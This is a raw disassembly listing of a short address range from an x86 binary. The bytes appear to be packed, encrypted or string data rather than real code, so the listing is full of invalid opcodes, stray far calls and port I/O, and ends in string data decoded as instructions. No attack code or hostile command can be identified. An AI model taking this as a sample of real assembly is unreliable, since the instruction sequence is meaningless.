  423309:	sub    al,0x5d
  42330b:	adc    DWORD PTR [edi-0x5b67b6c3],eax
  423311:	call   0xac491263
  423316:	cdq    
  423317:	add    BYTE PTR [ebx+0x657ab0d],dl
  42331d:	pop    esi
  42331e:	mov    dh,0x9d
  423320:	and    ah,BYTE PTR [ecx-0x2d9db8c7]
  423326:	mov    ss,WORD PTR [ebx]
  423328:	jnp    0x423385
  42332a:	and    bh,bl
  42332c:	mov    ebx,0xc30b1609
  423331:	push   edi
  423332:	ss pop esi
  423334:	pop    esp
  423335:	pop    ss
  423336:	outs   dx,DWORD PTR ds:[esi]
  423337:	mov    al,ds:0x6339ff4e
  42333c:	ins    BYTE PTR es:[edi],dx
  42333d:	fisubr WORD PTR [esi-0x7f]
  423340:	scas   eax,DWORD PTR es:[edi]
  423341:	mov    ebp,0x109ea4
	...
  423352:	push   ss
  423353:	aad    0xdf
  423355:	out    dx,eax
  423356:	fucomip st,st(7)
  423358:	ss std 
  42335a:	cmp    BYTE PTR [esi-0x7002a0c6],al
  423360:	sahf   
  423361:	sub    edx,ecx
  423363:	fld    QWORD PTR [ecx]
  423365:	add    BYTE PTR [ebx+0x0],bl
  423368:	add    BYTE PTR [eax],al
  42336a:	mov    ebx,0x4491260e
  42336f:	(bad)  
  423370:	in     eax,0x36
  423372:	shr    BYTE PTR [edx-0x4f],0xdc
  423376:	sub    eax,0xaac950ef
  42337b:	fidivr WORD PTR [edi+0x7614a7d0]
  423381:	add    ebp,edx
  423383:	stos   DWORD PTR es:[edi],eax
  423384:	scas   eax,DWORD PTR es:[edi]
  423385:	bnd jge 0x423360
  423388:	sub    bl,BYTE PTR [eax]
  42338a:	jne    0x423381
  42338c:	(bad)  
  42338d:	mov    ecx,0x96bdfeab
  423392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423393:	xchg   ebp,eax
  423394:	jmp    0x4a75:0x7c8fa955
  42339b:	retf   0x5fe3
  42339e:	popf   
  42339f:	push   ds
  4233a0:	pusha  
  4233a1:	cmp    esp,DWORD PTR [edi-0xa]
  4233a4:	dec    edx
  4233a5:	call   0xdf529204
  4233aa:	repnz add BYTE PTR [ebx],ch
  4233ad:	imul   edi,DWORD PTR [edi-0x2d],0xffffff89
  4233b1:	sub    al,0x6b
  4233b3:	sub    esp,ebp
  4233b5:	dec    edx
  4233b6:	and    esp,DWORD PTR [ecx]
  4233b8:	and    DWORD PTR [ebp-0x49a4cca2],0x7a3c8010
  4233c2:	or     eax,0x1499
	...
  4233cf:	add    BYTE PTR [eax],al
  4233d1:	add    BYTE PTR [esi+0x76],ch
  4233d4:	in     al,0xca
  4233d6:	cld    
  4233d7:	fisubr DWORD PTR [esi-0xa]
  4233da:	sbb    BYTE PTR [edx+0x6e609787],dl
  4233e0:	jb     0x423406
  4233e2:	sub    al,0xde
  4233e4:	add    DWORD PTR [eax],eax
  4233e6:	pop    ebx
  4233e7:	add    BYTE PTR [eax],al
  4233e9:	add    dl,dh
  4233eb:	add    eax,edi
  4233ed:	stos   DWORD PTR es:[edi],eax
  4233ee:	pop    ds
  4233ef:	aaa    
  4233f0:	rcl    dh,1
  4233f2:	sub    eax,0x3a1cc3ce
  4233f7:	mov    ecx,0x233b99dd
  4233fc:	aad    0xe
  4233fe:	lfs    ebx,FWORD PTR [edi-0x3c]
  423402:	mov    esi,?
  423404:	je     0x4233e0
  423406:	ja     0x423483
  423408:	shld   DWORD PTR [esp+ebp*4+0x27712eec],ebp,cl
  423410:	xor    BYTE PTR [edx-0x513e503c],bl
  423416:	and    ebx,DWORD PTR [esi-0x4521d302]
  42341c:	retf   
  42341d:	std    
  42341e:	lds    esp,FWORD PTR [edi-0x79]
  423421:	jnp    0x4233d4
  423423:	and    al,0x6c
  423425:	push   edx
  423426:	jns    0x42344f
  423428:	out    dx,al
  423429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42342a:	push   edi
  42342b:	icebp  
  42342c:	mov    bl,0x26
  42342e:	jmp    0xdcc63ea1
  423433:	cld    
  423434:	cmp    DWORD PTR [edx],esi
  423436:	imul   ebp,DWORD PTR [esi-0x6b],0x40
  42343a:	test   al,0x5a
  42343c:	(bad)  
  42343d:	sub    BYTE PTR ds:0x622bfd44,cl
  423443:	in     eax,dx
  423444:	add    al,BYTE PTR [eax]
	...
  423452:	cmp    dl,BYTE PTR [edx-0x3c]
  423455:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42345c:	nop
  42345d:	rcr    DWORD PTR [edi],cl
  42345f:	push   esi
  423460:	scas   al,BYTE PTR es:[edi]
  423461:	je     0x4233ea
  423463:	fiadd  WORD PTR [ecx]
  423465:	add    BYTE PTR [ebx+0x0],bl
  423468:	add    BYTE PTR [eax],al
  42346a:	(bad)  
  42346b:	adc    esi,DWORD PTR [esi]
  42346d:	(bad)  
  42346e:	push   edi
  42346f:	in     al,0xdb
  423471:	push   ebx
  423472:	stos   DWORD PTR es:[edi],eax
  423473:	push   0x9a6b54ae
  423478:	pusha  
  423479:	repnz repz (bad) 
  42347c:	dec    ebp
  42347d:	jmp    0x4234c9
  42347f:	imul   ebx,DWORD PTR [ecx+edi*8-0x7d],0xffffff94
  423484:	push   0x2430fb9c
  423489:	mov    al,0x64
  42348b:	sar    DWORD PTR [ebx-0x32ab9194],1
  423491:	jg     0x42345d
  423493:	fstp   TBYTE PTR [edx+0x48]
  423496:	adc    esi,DWORD PTR [ebp+0x2c33580b]
  42349c:	call   0x1a39:0x3954ecfa
  4234a3:	mov    ?,esp
  4234a5:	mov    edx,0x5270e2ea
  4234aa:	(bad)  
  4234ab:	ja     0x4234ec
  4234ad:	jp     0x423431
  4234af:	mov    esp,0xf1589a55
  4234b4:	or     edx,DWORD PTR [ebp-0x772f1f84]
  4234ba:	pop    esp
  4234bb:	sbb    bl,BYTE PTR [edx-0x3d]
  4234be:	sub    al,0xee
  4234c0:	retf   0x4b37
  4234c3:	sbb    DWORD PTR [ebx+0x0],esi
	...
  4234d1:	add    BYTE PTR [ebx-0x4293427d],dl
  4234d7:	jle    0x4234ac
  4234d9:	call   DWORD PTR [eax-0x20]
  4234dc:	cli    
  4234dd:	call   0xdee2:0xfc127055
  4234e4:	add    DWORD PTR [eax],eax
  4234e6:	pop    ebx
  4234e7:	add    BYTE PTR [eax],al
  4234e9:	add    bh,dh
  4234eb:	add    DWORD PTR [ecx],0xb41f2228
  4234f1:	dec    eax
  4234f2:	push   esp
  4234f3:	and    BYTE PTR [edx-0x279eb2d6],dh
  4234f9:	out    dx,eax
  4234fa:	add    eax,esi
  4234fc:	and    DWORD PTR [edx+0x892827f],ebx
  423502:	or     al,0x40
  423504:	not    DWORD PTR [eax-0x5f]
  423507:	push   ecx
  423508:	bound  esp,QWORD PTR [ebp+0x45]
  42350b:	adc    BYTE PTR [ecx-0x73fc7ecb],0xa8
  423512:	jbe    0x42357e
  423514:	in     eax,dx
  423515:	stos   BYTE PTR es:[edi],al
  423516:	out    dx,al
  423517:	pop    edi
  423518:	dec    edx
  423519:	xchg   ebx,eax
  42351a:	jg     0x423568
  42351c:	sub    edx,eax
  42351e:	add    edi,ecx
  423520:	std    
  423521:	inc    edi
  423522:	cmp    eax,0x66f2c1c4
  423527:	mov    bl,BYTE PTR [ecx-0x68]
  42352a:	push   ecx
  42352b:	inc    ecx
  42352c:	or     ch,ch
  42352e:	xor    al,0xdd
  423530:	sub    dh,BYTE PTR [esi]
  423532:	mov    bh,0xf
  423534:	shl    DWORD PTR [ebx-0x72b75801],1
  42353a:	push   esp
  42353b:	in     eax,dx
  42353c:	mov    dh,0xdb
  42353e:	bts    DWORD PTR [edi+0x76f7021c],ebp
	...
  423551:	add    ah,bl
  423553:	fincstp 
  423555:	shl    bh,0xee
  423558:	(bad)  
  423559:	frstor [ecx+eax*1]
  42355c:	pop    ebp
  42355d:	dec    edi
  42355e:	add    eax,DWORD PTR [eax]
  423560:	test   DWORD PTR [esi+0x1df3d],eax
  423566:	pop    ebx
  423567:	add    BYTE PTR [eax],al
  423569:	add    BYTE PTR [ebp-0xa],dl
  42356c:	fistp  QWORD PTR [ebx-0x6f]
  42356f:	fidiv  WORD PTR [edx+0x25]
  423572:	and    edx,DWORD PTR ds:0xa11d2f72
  423578:	dec    ebp
  423579:	popf   
  42357a:	ret    0x14e4
  42357d:	test   al,0x55
  42357f:	pop    edx
  423580:	into   
  423581:	das    
  423582:	pcmpeqd mm0,QWORD PTR [esi]
  423585:	out    0x46,al
  423587:	lock hlt 
  423589:	mov    cl,0x5a
  42358b:	cmp    cl,BYTE PTR [esi+0x58]
  42358e:	sti    
  42358f:	in     eax,dx
  423590:	lods   al,BYTE PTR ds:[esi]
  423591:	jno    0x42355e
  423593:	sub    ebx,DWORD PTR [eax+0x2a]
  423596:	mov    ds:0x7ee2e641,al
  42359b:	scas   eax,DWORD PTR es:[edi]
  42359c:	sub    eax,0x3b5a7353
  4235a1:	repz sub DWORD PTR [esi],eax
  4235a4:	sbb    eax,0xd50a8fec
  4235a9:	push   ecx
  4235aa:	in     al,0xef
  4235ac:	dec    eax
  4235ad:	push   esp
  4235ae:	cwde   
  4235af:	cs push cs
  4235b1:	xchg   ebx,eax
  4235b2:	push   edi
  4235b3:	dec    ebp
  4235b4:	sbb    dh,al
  4235b6:	pop    esp
  4235b7:	repz popa 
  4235b9:	arpl   WORD PTR [edx+0x5b],sp
  4235bc:	cli    
  4235bd:	lock sub dh,BYTE PTR [esi+ecx*1]
  4235c1:	out    0xdd,eax
  4235c3:	or     ecx,edi
	...
  4235d1:	add    BYTE PTR [edi-0x5e],ch
  4235d4:	aam    0x2a
  4235d6:	fnstsw WORD PTR [esi-0x1]
  4235d9:	out    0x52,eax
  4235db:	fcmovu st,st(5)
  4235dd:	in     eax,0x17
  4235df:	add    eax,0xdf98b505
  4235e4:	add    DWORD PTR [eax],eax
  4235e6:	pop    ebx
  4235e7:	add    BYTE PTR [eax],al
  4235e9:	add    BYTE PTR [esi+0x781be905],bh
  4235ef:	or     al,dl
  4235f1:	pop    esi
  4235f2:	fs add eax,0xbaac1872
  4235f8:	inc    ebp
  4235f9:	push   0xb6357cea
  4235fe:	pop    ss
  4235ff:	add    bl,BYTE PTR [ecx-0x25]
  423602:	pop    edx
  423603:	mov    ebx,0x10284b75
  423608:	sub    ecx,DWORD PTR [edi-0x8cae872]
  42360e:	mov    eax,0x1f8ddb2
  423613:	xor    ecx,edi
  423615:	mov    esi,DWORD PTR [eax-0x3ffd9eeb]
  42361b:	aam    0x54
  42361d:	sub    ebx,DWORD PTR [esi]
  42361f:	adc    ebp,0x37
  423622:	pop    esi
  423623:	inc    edx
  423624:	add    BYTE PTR [edx],0xfe
  423627:	mov    al,ds:0x4bdff6c1
  42362c:	push   ss
  42362d:	or     cl,dl
  42362f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423630:	mov    ah,0xea
  423632:	(bad)  
  423634:	inc    edx
  423635:	ror    BYTE PTR [ecx-0x73],cl
  423638:	imul   eax,DWORD PTR [edx-0xa],0x2ed30480
  42363f:	pop    ecx
  423640:	jb     0x423697
  423642:	xchg   edx,eax
  423643:	xchg   bh,bh
	...
  423651:	add    cl,bh
  423653:	sbb    al,al
  423655:	inc    esi
  423656:	jecxz  0x423636
  423658:	(bad)  
  423659:	mov    edi,0xe1f1bc83
  42365e:	mov    ds:0xf3e4c2e9,al
  423663:	fild   WORD PTR [ecx]
  423665:	add    BYTE PTR [ebx+0x0],bl
  423668:	add    BYTE PTR [eax],al
  42366a:	lea    ebx,[ebx]
  42366c:	mov    ah,0x8c
  42366e:	mul    BYTE PTR [edx]
  423670:	cmp    ecx,0x417811b0
  423676:	inc    ebx
  423677:	add    edx,ebp
  423679:	cmp    DWORD PTR [edi+ebx*2-0x2a],esi
  42367d:	mov    ebp,0xb3406d41
  423682:	fwait
  423683:	test   DWORD PTR ds:0xef4c10f6,0x38a3a2dc
  42368d:	shl    ebp,1
  42368f:	dec    esp
  423690:	pop    ss
  423691:	dec    esp
  423692:	(bad)  
  423693:	frstor [eax]
  423695:	sbb    DWORD PTR [edx+0x203e8db7],ebp
  42369b:	push   es
  42369c:	or     eax,DWORD PTR [edx]
  42369e:	add    ecx,DWORD PTR [ecx+0x6a]
  4236a1:	mov    esi,DWORD PTR [edi]
  4236a3:	pop    edx
  4236a4:	cmc    
  4236a5:	sub    ebx,DWORD PTR [edi-0x22]
  4236a8:	mov    eax,0x403b806e
  4236ad:	outs   dx,DWORD PTR ds:[esi]
  4236ae:	inc    esi
  4236af:	add    BYTE PTR [esp+esi*4],ah
  4236b2:	mov    dh,0xe5
  4236b4:	pusha  
  4236b5:	xchg   esp,eax
  4236b6:	sub    eax,0x131068b3
  4236bb:	ret    0x219e
  4236be:	jmp    0x4236b8
  4236c0:	xor    dl,BYTE PTR [esi+0x592107]
	...
  4236d2:	mov    eax,ds:0x3e8336b9
  4236d7:	(bad)  
  4236d8:	mov    ch,0xbb
  4236da:	icebp  
  4236db:	and    eax,0xb1008c27
  4236e0:	jne    0x4236c6
  4236e2:	dec    esi
  4236e3:	loopne 0x4236e6
  4236e5:	add    BYTE PTR [ebx+0x0],bl
  4236e8:	add    BYTE PTR [eax],al
  4236ea:	or     eax,edi
  4236ec:	mov    ds:0x4edaf7dc,al
  4236f1:	mov    al,BYTE PTR [ecx+0x29]
  4236f4:	lods   al,BYTE PTR ds:[esi]
  4236f5:	loopne 0x4236fb
  4236f7:	add    BYTE PTR [ebx+0x28700bfe],0x65
  4236fe:	xor    bh,BYTE PTR [esp+ebx*1+0x7e]
  423702:	or     BYTE PTR [ebp+0x3bf55a6d],0x51
  423709:	xchg   DWORD PTR ds:[ecx-0x46747ff1],esi
  423710:	or     ah,dl
  423712:	push   ecx
  423713:	stos   DWORD PTR es:[edi],eax
  423714:	test   DWORD PTR [esi+0x66b90976],edi
  42371a:	xchg   esi,eax
  42371b:	sti    
  42371c:	pusha  
  42371d:	mov    dh,0xc3
  42371f:	mov    DWORD PTR [edi+0x51c07207],eax
  423725:	mov    al,ds:0xfa631c69
  42372a:	pop    ss
  42372b:	mov    WORD PTR [eax],ds
  42372d:	mov    ds:0xe4d3a4bd,al
  423732:	inc    eax
  423733:	push   ebp
  423734:	cmp    eax,0x4203ee33
  423739:	cmp    DWORD PTR [ebp+0x74a3b77c],0x16
  423740:	in     eax,0xa6
  423742:	aas    
  423743:	push   ecx
  423744:	call   0x0:0x0
  42374b:	add    BYTE PTR [eax],al
  42374d:	add    BYTE PTR [eax],al
  42374f:	add    BYTE PTR [eax],al
  423751:	add    BYTE PTR [edx],dl
  423753:	xlat   BYTE PTR ds:[ebx]
  423754:	repz or esi,edi
  423757:	das    
  423758:	cli    
  423759:	fist   WORD PTR [ecx]
  42375b:	dec    ebx
  42375c:	es nop
  42375e:	mov    cl,0x78
  423760:	xchg   esi,eax
  423761:	dec    edi
  423762:	test   eax,0x5b0001e0
  423767:	add    BYTE PTR [eax],al
  423769:	add    BYTE PTR [edi],bh
  42376b:	(bad)  
  42376c:	jecxz  0x423741
  42376e:	int3   
  42376f:	inc    ebp
  423770:	cdq    
  423771:	jb     0x423707
  423773:	cmp    al,BYTE PTR [ecx-0x41]
  423776:	jns    0x4237e8
  423778:	adc    ch,ch
  42377a:	sti    
  42377b:	or     BYTE PTR [esi],dl
  42377d:	cmp    al,0x9d
  42377f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423780:	xlat   BYTE PTR ds:[ebx]
  423781:	cmp    esp,0x63
  423784:	dec    ecx
  423785:	pushf  
  423786:	fldenv [ebp+0x24]
  423789:	fsubrp st(5),st
  42378b:	mov    BYTE PTR [eax+esi*4-0x4b408bf7],bh
  423792:	push   0x36
  423794:	xchg   edi,eax
  423795:	mov    ?,WORD PTR [edx+0x4e2969c0]
  42379b:	push   0x75
  42379d:	xchg   ebp,eax
  42379e:	sub    eax,0xc584677a
  4237a3:	sub    ebp,DWORD PTR [eax-0x6aa23932]
  4237a9:	jg     0x4237fa
  4237ab:	pop    ecx
  4237ac:	ins    DWORD PTR es:[edi],dx
  4237ad:	sub    bl,BYTE PTR [esp+edi*4-0x6fdbd5e2]
  4237b4:	mov    ebx,0xd2271d06
  4237b9:	adc    al,0x11
  4237bb:	sahf   
  4237bc:	push   edx
  4237bd:	adc    ebx,DWORD PTR [esi+0x563530da]
  4237c3:	cmp    ch,BYTE PTR [esi+0x0]
	...
  4237d1:	add    BYTE PTR [eax],al
  4237d3:	rol    BYTE PTR [edx+0x0],0x4
  4237d7:	rol    BYTE PTR [edx+0x0],0x8
  4237db:	rol    BYTE PTR [edx+0x0],0xc
  4237df:	rol    BYTE PTR [edx+0x0],0x10
  4237e3:	rol    BYTE PTR [edx+0x0],0x14
  4237e7:	rol    BYTE PTR [edx+0x0],0x18
  4237eb:	rol    BYTE PTR [edx+0x0],0x1c
  4237ef:	rol    BYTE PTR [edx+0x0],0x57
  4237f3:	inc    edi
  4237f4:	cmp    DWORD PTR [edi+0x41],ebx
  4237f7:	pop    eax
  4237f8:	ss push esi
  4237fa:	pop    edi
  4237fb:	cmp    BYTE PTR [eax],al
  4237fd:	inc    ebx
  4237fe:	inc    ebp
  4237ff:	dec    esp
  423800:	pop    edi
  423801:	pop    eax
  423802:	push   edi
  423803:	dec    eax
  423804:	inc    edx
  423805:	add    BYTE PTR [edi+0x50],dl
  423808:	xor    eax,0x4641365f
  42380d:	cmp    DWORD PTR [edx],esi
  42380f:	xor    ebx,DWORD PTR [edi+0x32]
  423812:	aaa    
  423813:	add    BYTE PTR [eax+0x48],dl
  423816:	xor    BYTE PTR [edi+0x58],bl
  423819:	push   esp
  42381a:	inc    ecx
  42381b:	dec    ebp
  42381c:	push   ecx
  42381d:	pop    edi
  42381e:	inc    esi
  42381f:	push   ebp
  423820:	cmp    DWORD PTR [eax],eax
  423822:	push   edi
  423823:	push   ebp
  423824:	inc    ecx
  423825:	xor    dh,BYTE PTR [ebx]
  423827:	xor    ebx,DWORD PTR [edi+0x4e]
  42382a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42382e:	cmp    DWORD PTR [edi+0x38],ebx
  423831:	dec    ecx
  423832:	cmp    DWORD PTR [edx+0x36],ebx
  423835:	pop    edi
  423836:	dec    edx
  423837:	xor    BYTE PTR [edx+0x34],cl
  42383a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42383e:	xor    esi,DWORD PTR [eax]
  423840:	pop    edi
  423841:	inc    edx
  423842:	dec    ebx
  423843:	pop    eax
  423844:	pop    eax
  423845:	xor    eax,0x51414d00
  42384a:	pop    edi
  42384b:	inc    ecx
  42384c:	xor    al,BYTE PTR [ebp+0x5f]
  42384f:	inc    ecx
  423850:	dec    ebx
  423851:	cmp    DWORD PTR ds:0x5a003939,esi
  423857:	inc    ebp
  423858:	cmp    BYTE PTR [edi+0x4d],bl
  42385b:	ss dec eax
  42385d:	dec    ebx
  42385e:	add    BYTE PTR [ebp+0x57],al
  423861:	xor    DWORD PTR [edi+0x31],ebx
  423864:	dec    ebx
  423865:	xor    eax,DWORD PTR [ecx+0x30]
  423868:	push   ebx
  423869:	add    BYTE PTR [edx+esi*1+0x36],al
  42386d:	aaa    
  42386e:	pop    edi
  42386f:	push   edx
  423870:	dec    eax
  423871:	dec    ebp
  423872:	cmp    BYTE PTR [edi+0x37],bl
  423875:	inc    esi
  423876:	xor    eax,0x43355500
  42387b:	pop    edi
  42387c:	pop    ecx
  42387d:	dec    ecx
  42387e:	push   ebx
  42387f:	xor    bl,BYTE PTR [edi+0x52]
  423882:	add    BYTE PTR [eax+0x55],dl
  423885:	dec    ecx
  423886:	xor    BYTE PTR [edi+0x43],bl
  423889:	ss inc ebp
  42388b:	xor    bl,BYTE PTR [edi+0x4d]
  42388e:	xor    al,0x4a
  423890:	push   edx
  423891:	push   ebp
  423892:	add    BYTE PTR [esi+0x39],cl
  423895:	push   eax
  423896:	pop    edi
  423897:	push   ebp
  423898:	cmp    DWORD PTR [esi],esi
  42389a:	xor    BYTE PTR [ecx],dh
  42389c:	pop    edi
  42389d:	dec    edi
  42389e:	dec    esi
  42389f:	push   esp
  4238a0:	cmp    BYTE PTR [eax],al
  4238a2:	dec    esp
  4238a3:	xor    al,0x44
  4238a5:	xor    DWORD PTR [edi+0x4b],ebx
  4238a8:	xor    DWORD PTR [ebp+0x5f],eax
  4238ab:	pop    edx
  4238ac:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238b0:	pop    edi
  4238b1:	inc    edx
  4238b2:	xor    dh,BYTE PTR [ecx]
  4238b4:	push   ebx
  4238b5:	xor    DWORD PTR [ecx],edi
  4238b7:	inc    edx
  4238b8:	add    BYTE PTR [edi+0x45],al
  4238bb:	xor    al,0x38
  4238bd:	xor    BYTE PTR [eax],dh
  4238bf:	pop    edi
  4238c0:	dec    edx
  4238c1:	dec    ebx
  4238c2:	xor    eax,0x33345f4d
  4238c7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238cb:	pop    edi
  4238cc:	aaa    
  4238cd:	push   esi
  4238ce:	dec    ebx
  4238cf:	push   edx
  4238d0:	pop    edi
  4238d1:	inc    ebx
  4238d2:	add    BYTE PTR [edx+0x35],bl
  4238d5:	dec    ebp
  4238d6:	pop    edi
  4238d7:	inc    edi
  4238d8:	dec    esi
  4238d9:	xor    al,0x49
  4238db:	xor    eax,0x54590035
  4238e0:	push   edx
  4238e1:	pop    edi
  4238e2:	push   esp
  4238e3:	inc    ebx
  4238e4:	inc    ecx
  4238e5:	pop    edi
  4238e6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238e9:	push   ebp
  4238ea:	pop    edi
  4238eb:	push   ebp
  4238ec:	inc    ebp
  4238ed:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238f1:	pop    edi
  4238f2:	pop    eax
  4238f3:	dec    edx
  4238f4:	inc    edx
  4238f5:	inc    edi
  4238f6:	add    BYTE PTR [edx+0x36],al
  4238f9:	inc    ebx
  4238fa:	pop    edi
  4238fb:	xor    BYTE PTR ds:0x36464b,dh
  423901:	dec    ebx
  423902:	cmp    DWORD PTR [esi+0x37],eax
  423905:	xor    ebx,DWORD PTR [edi+0x35]
  423908:	ss inc edi
  42390a:	pop    ecx
  42390b:	dec    eax
  42390c:	pop    ecx
  42390d:	add    BYTE PTR [ebp+0x35],cl
  423910:	push   eax
  423911:	xor    BYTE PTR [edi+0x4f],bl
  423914:	pop    ecx
  423915:	xor    cl,BYTE PTR [edi+0x0]
  423918:	pop    ecx
  423919:	xor    DWORD PTR [esi+0x5f],ecx
  42391c:	xor    al,BYTE PTR [edx+0x30]
  42391f:	push   esi
  423920:	push   esp
  423921:	inc    ebp
  423922:	add    BYTE PTR [edi+0x37],al
  423925:	push   esi
  423926:	xor    DWORD PTR [edi+0x49],ebx
  423929:	xor    al,BYTE PTR [esi+0x30]
  42392c:	pop    edi
  42392d:	ss dec esi
  42392f:	cmp    BYTE PTR [eax],al
  423931:	pop    edx
  423932:	xor    eax,0x445f334b
  423937:	xor    BYTE PTR [eax],bh
  423939:	push   ecx
  42393a:	push   esi
  42393b:	xor    al,0x0
  42393d:	push   ebp
  42393e:	pop    eax
  42393f:	inc    edi
  423940:	xor    DWORD PTR [edi+0x39],ebx
  423943:	push   esp
  423944:	inc    ebx
  423945:	aaa    
  423946:	inc    esp
  423947:	add    BYTE PTR [edi+0x39],dl
  42394a:	ss pop edi
  42394c:	dec    eax
  42394d:	pop    edx
  42394e:	pop    ecx
  42394f:	inc    edi
  423950:	push   ebp
  423951:	pop    edi
  423952:	push   eax
  423953:	dec    eax
  423954:	inc    ebx
  423955:	add    BYTE PTR [ebp+0x0],dl
  423958:	xor    al,0x0
  42395a:	dec    edi
  42395b:	add    BYTE PTR [edi+0x0],bl
  42395e:	cmp    BYTE PTR [eax],al
  423960:	xor    al,BYTE PTR [eax]
  423962:	inc    ebx
  423963:	add    BYTE PTR [edx+0x0],bl
  423966:	inc    ebx
  423967:	add    BYTE PTR [edi],dh
  423969:	add    BYTE PTR [edi+0x0],bl
  42396c:	inc    ebx
  42396d:	add    BYTE PTR [eax+eax*1+0x0],al
  423971:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423975:	add    BYTE PTR [edx],dh
  423977:	add    BYTE PTR [edi+0x0],bl
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	dec    esp
  42397d:	add    BYTE PTR [esi+0x0],dl
  423980:	pop    edi
  423981:	add    BYTE PTR [ecx+0x0],bl
  423984:	push   edx
  423985:	add    BYTE PTR [esi+0x0],dl
  423988:	xor    al,BYTE PTR [eax]
  42398a:	cmp    BYTE PTR [eax],al
  42398c:	pop    edi
  42398d:	add    BYTE PTR [edx+0x0],cl
  423990:	add    BYTE PTR [eax],al
  423992:	inc    edx
  423993:	add    BYTE PTR [eax+eax*1+0x46],cl
  423997:	add    BYTE PTR [edi+0x0],bl
  42399a:	xor    eax,DWORD PTR [eax]
  42399c:	inc    ebp
  42399d:	add    BYTE PTR [ecx+0x0],cl
  4239a0:	push   edx
  4239a1:	add    BYTE PTR [ecx],bh
  4239a3:	add    BYTE PTR [esi+0x0],dl
  4239a6:	add    BYTE PTR [eax],al
  4239a8:	dec    ebp
  4239a9:	add    BYTE PTR [edi],dh
  4239ab:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239af:	add    BYTE PTR [edx+0x0],cl
  4239b2:	pop    eax
  4239b3:	add    BYTE PTR [ebx],dh
  4239b5:	add    BYTE PTR [ecx],dh
  4239b7:	add    BYTE PTR [ebx+0x0],al
  4239ba:	add    BYTE PTR [eax],al
  4239bc:	dec    edi
  4239bd:	add    BYTE PTR [esi],dh
  4239bf:	add    BYTE PTR [eax+0x0],cl
  4239c2:	pop    edi
  4239c3:	add    BYTE PTR [eax],dh
  4239c5:	add    BYTE PTR [edi],dh
  4239c7:	add    BYTE PTR [ecx],dh
  4239c9:	add    BYTE PTR [edx+0x0],dl
  4239cc:	xor    eax,0x55000000
  4239d1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239d5:	add    BYTE PTR [edi+0x0],bl
  4239d8:	push   esp
  4239d9:	add    BYTE PTR [ecx+0x0],al
  4239dc:	cmp    DWORD PTR [eax],eax
  4239de:	pop    edi
  4239df:	add    BYTE PTR [ebx],dh
  4239e1:	add    BYTE PTR [eax],dh
  4239e3:	add    BYTE PTR [eax],bh
  4239e5:	add    BYTE PTR [edi+0x0],cl
  4239e8:	inc    ebx
  4239e9:	add    BYTE PTR ds:0x4d000000,dh
  4239ef:	add    BYTE PTR [esi+0x0],cl
  4239f2:	inc    ebp
  4239f3:	add    BYTE PTR [edi+0x0],bl
  4239f6:	push   esp
  4239f7:	add    BYTE PTR [esi+0x0],al
  4239fa:	cmp    BYTE PTR [eax],al
  4239fc:	push   ebx
  4239fd:	add    BYTE PTR [edx+0x0],bl
  423a00:	pop    edi
  423a01:	add    BYTE PTR [eax],dh
  423a03:	add    BYTE PTR [eax],bh
  423a05:	add    BYTE PTR [eax+0x0],cl
  423a08:	add    BYTE PTR [eax],al
  423a0a:	dec    esi
  423a0b:	add    BYTE PTR [edi+0x0],cl
  423a0e:	pop    edx
  423a0f:	add    BYTE PTR [edi+0x0],bl
  423a12:	add    BYTE PTR ss:[ecx+0x0],bl
  423a16:	dec    ebp
  423a17:	add    BYTE PTR [esi],dh
  423a19:	add    BYTE PTR [ebx],dh
  423a1b:	add    BYTE PTR [edi+0x0],bl
  423a1e:	xor    al,0x0
  423a20:	dec    esi
  423a21:	add    BYTE PTR [edx],dh
  423a23:	add    BYTE PTR [esi],dh
  423a25:	add    BYTE PTR [ecx],dh
  423a27:	add    BYTE PTR [eax],al
  423a29:	add    BYTE PTR [ebx+0x0],cl
  423a2c:	dec    eax
  423a2d:	add    BYTE PTR [eax],bh
  423a2f:	add    BYTE PTR [edi+0x0],bl
  423a32:	inc    esi
  423a33:	add    BYTE PTR [esi+0x0],al
  423a36:	push   esp
  423a37:	add    BYTE PTR [edi],dh
  423a39:	add    BYTE PTR [esi],dh
  423a3b:	add    BYTE PTR [edi+0x0],bl
  423a3e:	dec    esp
  423a3f:	add    BYTE PTR [ecx+0x0],bl
  423a42:	add    BYTE PTR [eax],al
  423a44:	push   ebx
  423a45:	add    BYTE PTR [ecx+0x0],bl
  423a48:	xor    BYTE PTR [eax],al
  423a4a:	pop    edi
  423a4b:	add    BYTE PTR [ecx],bh
  423a4d:	add    BYTE PTR [edx+0x0],dl
  423a50:	dec    eax
  423a51:	add    BYTE PTR [ecx+0x0],bl
  423a54:	xor    al,BYTE PTR [eax]
  423a56:	pop    edi
  423a57:	add    BYTE PTR [eax],dh
  423a59:	add    BYTE PTR [eax],al
  423a5b:	add    BYTE PTR [edx+0x0],al
  423a5e:	dec    edx
  423a5f:	add    BYTE PTR [esi+0x0],cl
  423a62:	xor    al,BYTE PTR [eax]
  423a64:	pop    edi
  423a65:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a69:	add    BYTE PTR [edx+0x0],dl
  423a6c:	xor    al,0x0
  423a6e:	dec    eax
  423a6f:	add    BYTE PTR [eax],al
  423a71:	add    BYTE PTR [ebp+0x0],dl
  423a74:	add    BYTE PTR ss:[ebp+0x0],cl
  423a78:	xor    DWORD PTR [eax],eax
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [esi],dh
  423a7d:	add    BYTE PTR [ecx+0x0],bl
  423a80:	push   ebp
  423a81:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a85:	add    BYTE PTR [edi+0x0],cl
  423a88:	inc    esp
  423a89:	add    BYTE PTR [edi+0x0],dl
  423a8c:	push   ebx
  423a8d:	add    BYTE PTR [eax],al
  423a8f:	add    BYTE PTR [edx+0x0],bl
